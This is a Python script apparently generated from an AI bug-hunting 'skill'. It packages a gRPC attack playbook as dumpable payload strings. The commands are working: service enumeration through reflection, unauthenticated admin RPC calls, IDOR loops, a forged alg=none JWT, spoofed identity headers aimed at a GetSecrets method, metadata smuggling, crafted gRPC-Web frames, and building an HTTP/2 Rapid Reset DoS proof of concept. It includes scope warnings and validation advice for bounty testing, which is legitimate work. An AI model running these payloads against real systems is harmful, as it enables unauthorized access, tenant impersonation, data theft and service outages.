#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-grpc

Skill: HUNT-GRPC — gRPC Security
Desc : Hunt gRPC vulnerabilities — server reflection enabled (enumerate all services/methods), missing authentication / metadata-stripping on internal endpoints, plaintext gRPC over HTTP/2, internal endpoint disclosure, proto file leakage, gRPC-Web/grpc-gateway transcoding injection, and HTTP/2 Rapid Reset DoS (CVE-2023-44487). Use when target exposes port 50051 / 443 / 8443 / 9090 with HTTP/2, when grpcurl/grpcui detects reflection, when an Envoy or grpc-gateway proxy is fronting a microservice, or when recon reveals a microservice architecture.

Run:  python claude-bughunter-hunt-grpc.py --help
      python claude-bughunter-hunt-grpc.py --list
      python claude-bughunter-hunt-grpc.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-grpc'
TITLE = 'HUNT-GRPC — gRPC Security'
DESCRIPTION = 'Hunt gRPC vulnerabilities — server reflection enabled (enumerate all services/methods), missing authentication / metadata-stripping on internal endpoints, plaintext gRPC over HTTP/2, internal endpoint disclosure, proto file leakage, gRPC-Web/grpc-gateway transcoding injection, and HTTP/2 Rapid Reset DoS (CVE-2023-44487). Use when target exposes port 50051 / 443 / 8443 / 9090 with HTTP/2, when grpcurl/grpcui detects reflection, when an Envoy or grpc-gateway proxy is fronting a microservice, or when recon reveals a microservice architecture.'

PAYLOADS = {
    'main': ["name: hunt-grpc", "description: \"Hunt gRPC vulnerabilities \u2014 server reflection enabled (enumerate all services/methods), missing authentication / metadata-stripping on internal endpoints, plaintext gRPC over HTTP/2, internal endpoint disclosure, proto file leakage, gRPC-Web/grpc-gateway transcoding injection, and HTTP/2 Rapid Reset DoS (CVE-2023-44487). Use when target exposes port 50051 / 443 / 8443 / 9090 with HTTP/2, when grpcurl/grpcui detects reflection, when an Envoy or grpc-gateway proxy is fronting a microservice, or when recon reveals a microservice architecture.\"", "sources: hackerone_public, grpc_security_research, cert_cc_advisory", "report_count: 6"],
    'hunt-grpc-grpc-security': [],
    'crown-jewel-targets': ["gRPC reflection enabled = full service catalog enumeration without source code. The highest-value gRPC bugs come from the architectural assumption that a service is \"internal\" \u2014 auth is enforced at the edge proxy, and the backend trusts any caller that reaches it. Once you reach the backend directly (exposed port, SSRF, proxy bypass), that trust collapses.", "**Highest-value findings:**", "- **Reflection enabled in production** \u2014 `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` lists every method, message, and internal service. Enumeration enabler, not a vuln on its own (see Validation).", "- **Missing auth on internal service** \u2014 a service designed for east-west microservice traffic exposed externally with no mTLS and no per-method authorization \u2192 call privileged methods directly.", "- **Edge-auth-only / metadata-stripping** \u2014 proxy authenticates the user but the backend re-trusts proxy-injected headers (`x-user-id`, `x-tenant-id`, `x-forwarded-*`); if you reach the backend or can inject those headers via the proxy, you impersonate any tenant.", "- **Plaintext gRPC** \u2014 gRPC h2c (cleartext HTTP/2) on a non-standard port \u2192 credential/metadata interception.", "- **HTTP/2 Rapid Reset DoS (CVE-2023-44487)** \u2014 interleaved HEADERS + immediate RST_STREAM frames bypass `MAX_CONCURRENT_STREAMS` accounting \u2192 resource exhaustion. **DoS is in scope on almost no program \u2014 get explicit written authorization before sending a single burst.**"],
    'phase-1-fingerprint-port-discovery': ["```bash"],
    'common-grpc-ports-50051-native-443-8443-via-tls-alpn-h2-9090-8080-h2c': ["nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET 2>/dev/null | grep open"],
    'alpn-must-negotiate-h2-grpc-cannot-run-on-http-1-1': ["echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep -i \"ALPN.*h2\""],
    'native-grpc-fingerprint-an-http-2-post-to-a-bogus-method-returns-a-grpc-status': [],
    'trailer-12-unimplemented-even-when-the-path-is-wrong-strong-signal-it-s-grpc': ["curl -s --http2-prior-knowledge -X POST \"http://$TARGET:9090/x.Y/Z\" \\", "-H \"content-type: application/grpc\" -o /dev/null -D - | grep -i grpc-status"],
    'tls-fronted-h2-port-443-look-for-grpc-status-trailer-grpc-content-type': ["curl -s --http2 -X POST \"https://$TARGET/grpc.health.v1.Health/Check\" \\", "-H \"content-type: application/grpc-web+proto\" -o /dev/null -D - | grep -i \"grpc-status\\|content-type\"", "`grpc-status` trailer present \u21d2 a gRPC server (or grpc-gateway/Envoy) is behind that port. `UNIMPLEMENTED` on a random path is normal and only confirms the transport \u2014 not a finding."],
    'phase-2-service-enumeration-via-reflection': ["```bash", "brew install grpcurl   # or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest"],
    'list-services-plaintext-for-h2c-insecure-for-self-signed-tls-plain-for-valid-tls': ["grpcurl -plaintext $TARGET:50051 list", "grpcurl -insecure  $TARGET:443   list"],
    'typical-output-when-reflection-is-on': [],
    'grpc-reflection-v1-serverreflection': [],
    'grpc-health-v1-health': [],
    'user-userservice': [],
    'admin-adminservice': [],
    'payment-paymentservice': [],
    'list-describe-every-method-of-each-service': ["grpcurl -plaintext $TARGET:50051 list admin.AdminService", "grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser", "grpcurl -plaintext $TARGET:50051 describe .admin.DeleteUserRequest   # message schema"],
    'dump-the-whole-catalog-to-triage-interesting-surfaces': ["for SVC in $(grpcurl -plaintext $TARGET:50051 list); do", "echo \"== $SVC ==\"; grpcurl -plaintext $TARGET:50051 list \"$SVC\"", "done | tee grpc-catalog.txt", "grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grpc-catalog.txt", "**Reflection disabled?** You can still call known methods if you can guess them, or rebuild the descriptor set from a leaked `.proto` (Phase 5) and pass it with `grpcurl -protoset bundle.bin ...`. Reflection-off is a hardening control, not a security boundary."],
    'phase-3-call-methods-without-authentication-authz-testing': ["```bash"],
    'baseline-call-a-sensitive-method-with-no-auth-metadata': ["grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers"],
    'idor-across-an-enumerable-id-field': ["for ID in 1 2 3 100 1000 1001; do", "echo \"id=$ID\"; grpcurl -plaintext $TARGET:50051 \\", "-d \"{\\\"user_id\\\": $ID}\" user.UserService/GetUser 2>&1 | head -4", "**Interpret the gRPC status code, not just whether bytes came back (see Validation):**", "- `OK` + populated response \u2192 method executed unauthenticated \u2192 finding.", "- `Unauthenticated (16)` / `PermissionDenied (7)` \u2192 authz is enforced; NOT a finding.", "- `Unimplemented (12)` \u2192 wrong path / method not on this server.", "- `InvalidArgument (3)` \u2192 reached and parsed your input \u2192 method is callable; fix the payload and retry."],
    'phase-4-authentication-trust-boundary-bypass': ["```bash"],
    'a-forged-bearer-alg-none-jwt-in-the-authorization-metadata': ["grpcurl -plaintext $TARGET:50051 \\", "-H \"authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0.\" \\", "-d '{}' admin.AdminService/GetConfig"],
    'b-backend-trusts-proxy-headers-many-grpc-backends-authenticate-at-envoy-and': [],
    'then-trust-identity-injected-as-metadata-if-the-edge-does-not-strip-these': [],
    'spoofing-them-full-impersonation-test-every-plausible-name': ["for H in \"x-user-id: 1\" \"x-authenticated-user: admin\" \"x-tenant-id: 0\" \\", "\"x-internal-request: true\" \"x-forwarded-for: 127.0.0.1\" \\", "\"x-envoy-internal: true\" \"grpc-internal-encoding-request: true\"; do", "echo \"== $H ==\"", "grpcurl -plaintext $TARGET:50051 -H \"$H\" -d '{}' internal.InternalService/GetSecrets 2>&1 | head -3"],
    'c-binary-metadata-smuggling-keys-ending-in-bin-are-base64-decoded-by-the': [],
    'server-some-auth-middlewares-only-inspect-text-metadata-missing-bin-keys': ["grpcurl -plaintext $TARGET:50051 -H \"auth-token-bin: $(printf admin|base64)\" \\", "-d '{}' admin.AdminService/GetConfig", "The metadata-stripping bug (b) is the gRPC-specific crown jewel: confirm it by sending the spoofed header **directly to the backend port** AND, separately, **through the public proxy** \u2014 if the proxy forwards your `x-user-id` unchanged to the backend, it is exploitable for real users, not just on the bypassed port."],
    'phase-5-proto-file-schema-discovery': ["```bash"],
    'proxies-envoy-grpc-gateway-sometimes-serve-descriptors-or-swagger': ["for P in proto api/proto swagger.json openapiv2 service.swagger.json descriptor.pb; do", "S=$(curl -s -o /dev/null -w '%{http_code}' \"https://$TARGET/$P\")", "[ \"$S\" != 404 ] && echo \"Found: /$P ($S)\""],
    'source-registry-leakage-of-proto-definitions': ["gh search code --owner \"$TARGET_ORG\" 'syntax = \"proto3\"' --limit 20 2>/dev/null", "gh search code --owner \"$TARGET_ORG\" 'service ' filename:.proto --limit 20 2>/dev/null"],
    'rebuild-a-descriptor-set-from-leaked-protos-and-drive-the-api-without-reflection': ["protoc --descriptor_set_out=bundle.bin --include_imports -I proto/ proto/*.proto", "grpcurl -protoset bundle.bin -plaintext $TARGET:50051 list", "Proto leakage on its own is low severity; its value is as the key that unlocks Phases 3\u20134 against a reflection-disabled target."],
    'phase-6-grpc-web-grpc-gateway-json-transcoding-attacks': ["gRPC almost always reaches the browser through a transcoder: **Envoy `grpc_web`/`grpc_json_transcoder`**, **grpc-gateway** (REST\u2194gRPC), or **Connect**. These translators are the realistic external attack surface and frequently re-expose internal methods.", "```bash"],
    'a-grpc-gateway-maps-grpc-methods-to-rest-reflection-derived-method-names-often': [],
    'map-predictably-hit-them-over-plain-http-json-no-grpc-client-needed': ["curl -s -X POST \"https://$TARGET/v1/admin/users:list\" -H 'content-type: application/json' -d '{}'", "curl -s -X POST \"https://$TARGET/admin.AdminService/ListUsers\" \\", "-H 'content-type: application/json' -d '{}'    # default unannotated route"],
    'b-build-a-real-grpc-web-length-prefixed-frame-instead-of-a-hand-waved-one': [],
    'frame-1-byte-flag-0x00-data-4-byte-big-endian-length-protobuf-payload': [],
    'encode-the-message-with-protoscope-so-the-bytes-are-correct': [],
    'protoscope-s-1-1-msg-bin-field-1-e-g-user-id-1': ["MSG=$(xxd -p msg.bin | tr -d '\\n')", "LEN=$(printf '%08x' $((${#MSG}/2)))                 # 4-byte length prefix", "FRAME=$(printf '00%s%s' \"$LEN\" \"$MSG\")", "echo \"$FRAME\" | xxd -r -p > frame.bin", "curl -s \"https://$TARGET/user.UserService/GetUser\" \\", "-H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \\", "--data-binary @frame.bin | xxd | head"],
    'c-grpc-web-json-variant-envoy-connect-no-manual-framing-needed': ["curl -s \"https://$TARGET/user.UserService/GetUser\" \\", "-H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' \\", "-d '{\"user_id\": 1}'"],
    'd-connect-protocol-buf-plain-json-post-unary-no-framing': ["curl -s \"https://$TARGET/user.UserService/GetUser\" \\", "-H 'content-type: application/json' -H 'connect-protocol-version: 1' \\", "-d '{\"user_id\": 1}'", "Why this matters: the browser-facing transcoder commonly forwards to the SAME backend as the internal gRPC plane. If the transcoder route exposes `AdminService` or fails to require the auth the gRPC client would have sent, you have a real, externally-reachable authz bug. Confirm each transcoded route returns `OK` with sensitive data, and verify it is reachable as an unauthenticated/low-priv user (not just from inside the mesh)."],
    'phase-7-http-2-rapid-reset-dos-cve-2023-44487': ["**Authorization gate:** DoS is out of scope on the overwhelming majority of programs. Do NOT run this without explicit, written, scoped permission and a target/window the program owner agreed to. Skip to Validation if unsure.", "The attack is NOT a load test. It opens streams (HEADERS) and immediately cancels them (RST_STREAM) before the server finishes, so each cancelled stream frees a `MAX_CONCURRENT_STREAMS` slot instantly while the server still spends work on it \u2014 the client races far ahead of the concurrency cap. `h2load`/`ghz` are throughput benchmarkers; **they have no rapid-reset mode and never interleave HEADERS+immediate-RST_STREAM, so they cannot test this.**", "**Correct tooling \u2014 author-sanctioned PoCs that actually emit the frame pattern:**", "```bash"],
    'cert-cc-community-tracking-and-pocs-for-cve-2023-44487': [],
    'https-kb-cert-org-vuls-id-421644': [],
    'https-blog-cloudflare-com-technical-breakdown-http2-rapid-reset-ddos-attack-cloudflare-writeup': [],
    'go-poc-that-sends-headers-then-immediate-rst-stream-in-a-tight-loop': ["git clone https://github.com/secengjeff/rapidresetclient", "cd rapidresetclient && go build -o rapidreset ."],
    'detection-only-a-short-low-count-burst-with-permission-then-stop': ["./rapidreset --help    # confirm current flags first, then a SMALL authorized burst, e.g.:"],
    'rapidreset-url-https-target-443-concurrency-1-requests-20': [],
    'if-you-must-roll-your-own-use-the-h2-framing-layer-golang-org-x-net-http2': [],
    'to-write-a-headers-frame-immediately-followed-by-rst-stream-cancel-per-stream-id': ["**Detection without DoSing \u2014 prefer this:** the only thing you need to PROVE is whether mitigations are present. Check the server banner / version and whether it tracks reset floods:", "```bash"],
    'fingerprint-the-http-2-implementation-and-version-patched-versions-are-known': ["curl -sI --http2 https://$TARGET/ | grep -i '^server:'"],
    'nghttp2-1-57-0-go-net-http-with-the-2023-10-fix-envoy-1-27-1-1-26-5-1-25-10-1-24-11': [],
    'grpc-go-1-56-3-1-57-1-1-58-3-are-mitigated-version-match-instead-of-flooding': ["Report the *version-confirmed* mitigation gap rather than a benchmark slowdown. \"Server got slower under load\" is not proof of CVE-2023-44487 \u2014 it produces false positives on slow/under-provisioned servers and false negatives on patched ones that throttle resets gracefully."],
    'tools': ["```bash", "grpcurl   # primary CLI client (list/describe/call, -protoset for reflection-off)", "grpcui    # web UI for interactive exploration:  grpcui -plaintext $TARGET:50051", "protoc + protoscope   # build/inspect raw protobuf and gRPC-Web frames (Phase 6)", "buf       # lint/inspect proto, drive Connect endpoints"],
    'dos-only-authorized-engagements-secengjeff-rapidresetclient-true-rapid-reset-poc': [],
    'note-ghz-and-h2load-are-load-benchmarkers-not-rapid-reset-testers-do-not': [],
    'use-them-to-prove-cve-2023-44487': [],
    'chain-table': ["Related skills: **hunt-idor** (id enumeration logic), **hunt-api-misconfig** (JWT alg=none / mass-assignment in request messages), **hunt-auth-bypass** (edge-vs-backend trust boundary), **hunt-tls-network** (h2c/plaintext + ALPN), **cloud-iam-deep** (if a called RPC returns cloud creds)."],
    'validation-false-positive-discipline': ["gRPC's failure modes look like successes to a naive `grep`. Apply these gates before any submission.", "1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` mean auth WORKS \u2014 close the candidate. `Unimplemented (12)` means you have the wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.", "2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, **info disclosure (Low/Medium at most)** \u2014 many vendors ship reflection on by design. Do NOT report it as \"missing auth\" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.", "3. **Distinguish \"no auth\" from \"auth not required for THIS method.\"** Some methods (health, public catalog reads) are legitimately anonymous. Prove the bug by showing an authenticated-vs-unauthenticated **state delta**: the same RPC returns another user's/tenant's private data without credentials, or a mutating admin RPC executes (re-read the changed state to confirm side-effect).", "4. **Proxy-vs-backend reachability.** A bug reachable only by hitting an internal `:50051` you found via SSRF/port-scan is real but its severity depends on reachability. State explicitly how an external attacker reaches it (exposed port, SSRF egress, proxy passthrough). For metadata-spoofing, prove the PUBLIC proxy forwards the spoofed header \u2014 not just the bypassed backend port.", "5. **OOB / Collaborator for anything blind.** If an RPC takes a URL/host argument (webhook, import, render), it is an SSRF candidate: point it at a Burp Collaborator payload with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF. No interaction = no SSRF. Hand off to **hunt-ssrf**.", "6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark \"slowdown.\" Either (a) version-match an unpatched HTTP/2 stack from the `server:` banner, or (b) demonstrate the reset-flood ONLY under explicit written authorization with an agreed window \u2014 then stop immediately. A slow response is not proof.", "**Severity guide (after the gates above pass):**", "- Sensitive/admin RPC callable with no auth, side-effect proven \u2192 **Critical**", "- Proxy-forwarded metadata spoofing \u2192 cross-tenant impersonation \u2192 **Critical**", "- IDOR / mass PII via enumerable RPC \u2192 **High**", "- Internal service externally reachable (transcoder or open port) \u2192 **High**", "- Plaintext h2c leaking bearer metadata \u2192 **High**", "- Reflection enabled exposing non-public catalog \u2192 **Medium** (enabler)", "- Proto/descriptor leak, no callable sensitive method \u2192 **Low**"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()